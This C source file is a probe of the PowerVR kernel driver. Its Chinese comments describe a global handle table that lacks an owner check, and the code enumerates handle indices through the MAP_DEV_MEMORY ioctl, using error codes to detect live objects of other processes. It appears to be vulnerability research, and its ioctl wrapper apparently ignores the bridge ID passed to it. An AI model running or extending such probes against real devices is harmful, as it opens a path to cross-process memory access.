/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * pvr_handle_scan.c —— 全局 KERNEL_HANDLE_BASE 的只读枚举探测
 *
 * 背景（bridged_pvr_bridge.c:854）：
 *   PVRSRVMapDeviceMemoryBW 用 **KERNEL_HANDLE_BASE（全局表）** 查 hKernelMemInfo，
 *   而紧邻的 hDstDevMemHeap 用 psPerProc->psHandleBase（进程私有）。
 *   ExportDeviceMemBW（:819）把 meminfo 导出到同一个全局表，且**没有 owner/PID 校验**。
 *   handle 是表索引编码，故理论可枚举。
 *
 * 本探针只做只读枚举：
 *   对 hKernelMemInfo = 0..N 调 MAP_DEV_MEMORY，hDstDevMemHeap 固定传 0（必然 lookup 失败），
 *   只读 out.eError，按错误码归类。**不会创建任何映射**（heap lookup 失败即返回）。
 *
 * 判读：
 *   - 大量 index 返回同一个"未分配"错误 ⇒ index 空闲
 *   - 出现少量不同的错误码 ⇒ 该 index 上有对象（类型不匹配 / 越界 / 存在）
 *   - 一旦某 index 的 eError 与其他不同，就是"全局表里有活对象"的证据
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define PVR_IOC_GID	'g'

struct pvr_pkg {
	uint32_t ui32BridgeID;
	uint32_t ui32Size;
	void *pvParamIn;
	uint32_t ui32InBufferSize;
	void *pvParamOut;
	uint32_t ui32OutBufferSize;
	uint32_t hKernelServices;
};

#define PVR_IOWR(idx)	_IOWR(PVR_IOC_GID, idx, struct pvr_pkg)

#define BRIDGE_CONNECT_SERVICES	PVR_IOWR(12)
#define BRIDGE_MAP_DEV_MEMORY	PVR_IOWR(20)

struct in_connect {
	uint32_t ui32BridgeFlags;
	uint32_t ui32Flags;
};
struct out_connect {
	uint32_t eError;
	uint32_t hKernelServices;
};

struct in_map_dev_mem {
	uint32_t ui32BridgeFlags;
	uint32_t hKernelMemInfo;
	uint32_t hDstDevMemHeap;
};

#define SCAN_MAX 0x180

static int pvr_call(int fd, uint32_t bridge_id, void *in, uint32_t in_sz,
		    void *out, uint32_t out_sz, uint32_t hks)
{
	struct pvr_pkg p;

	memset(&p, 0, sizeof p);
	p.ui32BridgeID = bridge_id;
	p.ui32Size = sizeof p;
	p.pvParamIn = in;
	p.ui32InBufferSize = in_sz;
	p.pvParamOut = out;
	p.ui32OutBufferSize = out_sz;
	p.hKernelServices = hks;
	return ioctl(fd, PVR_IOWR(12), &p);
}

int main(void)
{
	int fd, ret;
	uint32_t hks = 0;
	struct in_connect ci;
	struct out_connect co;
	int i;
	/* 错误码直方图：记录每个不同 eError 值出现的 index */
	uint32_t codes[64];
	int counts[64];
	int ncode = 0;
	int first_idx[64];

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== PVR global handle scan ===\n");

	fd = open("/dev/pvrsrvkm", O_RDWR);
	if (fd < 0) {
		printf("[!] open: %s\n", strerror(errno));
		return 1;
	}

	memset(&ci, 0, sizeof ci);
	memset(&co, 0, sizeof co);
	ret = pvr_call(fd, BRIDGE_CONNECT_SERVICES, &ci, sizeof ci, &co,
		       sizeof co, 0);
	if (ret != 0) {
		printf("[!] CONNECT ret=%d errno=%d\n", ret, errno);
		return 2;
	}
	hks = co.hKernelServices;
	printf("[0] CONNECT ok hks=%#x\n", hks);

	memset(codes, 0xff, sizeof codes);
	memset(first_idx, 0xff, sizeof first_idx);

	for (i = 0; i < SCAN_MAX; i++) {
		struct in_map_dev_mem mi;
		uint32_t e = 0xdeadbeef;
		int j, found = 0;

		memset(&mi, 0, sizeof mi);
		mi.hKernelMemInfo = (uint32_t)i;
		mi.hDstDevMemHeap = 0;		/* 必然 lookup 失败，只探 handle 侧 */
		ret = pvr_call(fd, BRIDGE_MAP_DEV_MEMORY, &mi, sizeof mi,
			       &e, sizeof e, hks);
		if (ret != 0)
			e = 0xeeee0000 | (errno & 0xffff);

		for (j = 0; j < ncode; j++) {
			if (codes[j] == e) {
				counts[j]++;
				found = 1;
				break;
			}
		}
		if (!found && ncode < 64) {
			codes[ncode] = e;
			counts[ncode] = 1;
			first_idx[ncode] = i;
			ncode++;
		}
	}

	printf("[1] eError 直方图（index 0..%d）:\n", SCAN_MAX - 1);
	{
		int j;
		for (j = 0; j < ncode; j++)
			printf("    eError=%-12u 出现 %4d 次，首次 index=%d\n",
			       codes[j], counts[j], first_idx[j]);
	}

	close(fd);
	printf("=== done ===\n");
	return 0;
}
